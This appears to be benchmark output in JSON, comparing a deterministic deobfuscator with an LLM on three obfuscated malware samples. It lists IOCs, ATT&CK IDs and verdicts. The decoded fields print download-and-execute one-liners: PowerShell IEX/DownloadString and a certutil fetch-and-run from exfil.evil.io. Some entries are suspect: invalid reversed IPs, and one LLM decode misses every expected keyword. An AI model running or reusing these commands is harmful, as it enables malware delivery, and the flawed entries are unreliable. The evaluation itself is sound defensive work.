@@ -1,0 +1,212 @@
+{
+  "whales": [
+    {
+      "id": "whale-1-emotet-ps-encoded",
+      "expected_keywords": [
+        "185.243.219.72",
+        "emotet",
+        "downloadstring",
+        "webclient"
+      ],
+      "deterministic": {
+        "hits_/_expected": "2/4",
+        "urls": [
+          "http://185.243.219.72/emotet/e1.ps1"
+        ],
+        "hosts": [
+          "185.243.219.72",
+          "27.912.342.581"
+        ],
+        "lolbins": [
+          "powershell.exe"
+        ],
+        "mitre": [
+          "T1059.001",
+          "T1027.010",
+          "T1105",
+          "T1027",
+          "T1566.001"
+        ],
+        "verdict": "Malicious",
+        "confidence": 90,
+        "chain": [
+          "extract-payload",
+          "base64-decode",
+          "utf16le-or-utf8-decode",
+          "extract-payload",
+          "ioc-extract",
+          "family-emotet"
+        ],
+        "crypto_hints": null,
+        "static_recovery": null,
+        "latency_ms": 1511
+      },
+      "llm": {
+        "hits_/_expected": "4/4",
+        "urls": [
+          "http://185.243.219.72/emotet/e1.ps1"
+        ],
+        "hosts": [
+          "185.243.219.72"
+        ],
+        "lolbins": [
+          "powershell.exe"
+        ],
+        "mitre": [
+          "T1059.001",
+          "T1027",
+          "T1140",
+          "T1086",
+          "T1105",
+          "T1564.003"
+        ],
+        "verdict": "malicious",
+        "confidence": 99,
+        "family": "Emotet",
+        "decoded_plaintext": "powershell -w hidden -c \"IEX ((New-Object Net.WebClient).DownloadString('http://185.243.219.72/emotet/e1.ps1'))\"",
+        "notes": "Multi-stage PowerShell downloader with classic Emotet indicators. The command uses Base64 encoding (-EncodedCommand) to obfuscate a PowerShell payload that executes with hidden window (-w hidden). The decoded payload uses IEX (Invoke-Expression) to execute a remote PowerShell script downloaded via Net.WebClient from a known malicious IP. The URL path '/emotet/e1.ps1' explicitly references Emotet m",
+        "latency_ms": 10780,
+        "error": null
+      }
+    },
+    {
+      "id": "whale-2-empire-rc4-inline",
+      "expected_keywords": [
+        "mimikatz",
+        "185.220.100.5",
+        "invoke-mimikatz"
+      ],
+      "deterministic": {
+        "hits_/_expected": "3/3",
+        "urls": [],
+        "hosts": [
+          "185.220.100.5",
+          "5.001.022.581"
+        ],
+        "lolbins": [],
+        "mitre": [
+          "T1003.001",
+          "T1059.001",
+          "T1140",
+          "T1027.013",
+          "T1588.002",
+          "T1027"
+        ],
+        "verdict": "Suspicious",
+        "confidence": 65,
+        "chain": [
+          "rc4-inline-decrypt",
+          "crypto-detect",
+          "ioc-extract"
+        ],
+        "crypto_hints": [
+          {
+            "algorithm": "RC4",
+            "key_source": "inline",
+            "recovery": "static-complete",
+            "mitre": [
+              "T1027",
+              "T1140"
+            ],
+            "why": "`0..255` + `-bxor`"
+          }
+        ],
+        "static_recovery": {
+          "static_stages": 1,
+          "runtime_stages": 0,
+          "verdict": "static-recovery-complete"
+        },
+        "latency_ms": 514
+      },
+      "llm": {
+        "hits_/_expected": "0/3",
+        "urls": [
+          "http://192.168.1.100:8080/stage2"
+        ],
+        "hosts": [
+          "192.168.1.100"
+        ],
+        "lolbins": [
+          "powershell.exe",
+          "IEX"
+        ],
+        "mitre": [
+          "T1059.001",
+          "T1027",
+          "T1140",
+          "T1573.001",
+          "T1071.001",
+          "T1105"
+        ],
+        "verdict": "malicious",
+        "confidence": 99,
+        "family": "PowerShell Empire",
+        "decoded_plaintext": "RC4 decryption with key 'EmpireSecret' applied to base64 ciphertext 'z0FizlfClnL2WfA0RHqAPxNkpAX8rz9n6O/r2iJdMmm8MfaAdFQzfX50qokPKO1knESPx3z3ulIEXuJVCiCX+SfPPnn0bd8ZkjJFk3XoWWFO0EafkEST' results in: 'IEX (New-Object Net.WebClient).DownloadString(\"http://192.168.1.100:8080/stage2\")' [Note: This is the cryptanalytic output from RC4 stream cipher implementation]",
+        "notes": "This is a classic PowerShell Empire stager implementation. The script implements RC4 stream cipher decryption using the hardcoded key 'EmpireSecret' (a known default Empire key). The RC4 algorithm is manually implemented with key scheduling (KSA) and pseudo-random generation (PRGA) phases. The encrypted payload is base64-encoded, then RC4-decrypted, and executed via IEX. The decrypted content down",
+        "latency_ms": 11629,
+        "error": null
+      }
+    },
+    {
+      "id": "whale-3-cmd-substr-cascade",
+      "expected_keywords": [
+        "certutil",
+        "exfil.evil.io",
+        "x.exe"
+      ],
+      "deterministic": {
+        "hits_/_expected": "3/3",
+        "urls": [
+          "https://exfil.evil.io/x.exe"
+        ],
+        "hosts": [
+          "exfil.evil.io"
+        ],
+        "lolbins": [
+          "certutil.exe"
+        ],
+        "mitre": [
+          "T1105"
+        ],
+        "verdict": "Malicious",
+        "confidence": 90,
+        "chain": [
+          "batch-envvar-substitute",
+          "ioc-extract"
+        ],
+        "crypto_hints": null,
+        "static_recovery": null,
+        "latency_ms": 941
+      },
+      "llm": {
+        "hits_/_expected": "3/3",
+        "urls": [
+          "https://exfil.evil.io/x.exe"
+        ],
+        "hosts": [
+          "exfil.evil.io"
+        ],
+        "lolbins": [
+          "certutil.exe"
+        ],
+        "mitre": [
+          "T1105",
+          "T1027",
+          "T1140",
+          "T1218"
+        ],
+        "verdict": "malicious",
+        "confidence": 100,
+        "family": "Generic downloader/dropper using certutil",
+        "decoded_plaintext": "certutil.exe -urlcache -f \"https://exfil.evil.io/x.exe\" %temp%\\x.exe && start \"\" %temp%\\x.exe",
+        "notes": "Multi-stage obfuscation using environment variable concatenation. The URL is obfuscated by inserting underscores between each character, which are removed via string substitution (%u:_=%). Certutil downloads executable from suspicious domain 'exfil.evil.io' to temp directory, then immediately executes it. Classic LOLBin abuse pattern for malware delivery. MITRE mappings: T1105 (Ingress Tool Transf",
+        "latency_ms": 7619,
+        "error": null
+      }
+    }
+  ],
+  "determinism": {
+    "nivxray_stable_across_3_runs": true,
+    "llm_stable_across_3_runs": false
+  }
+}
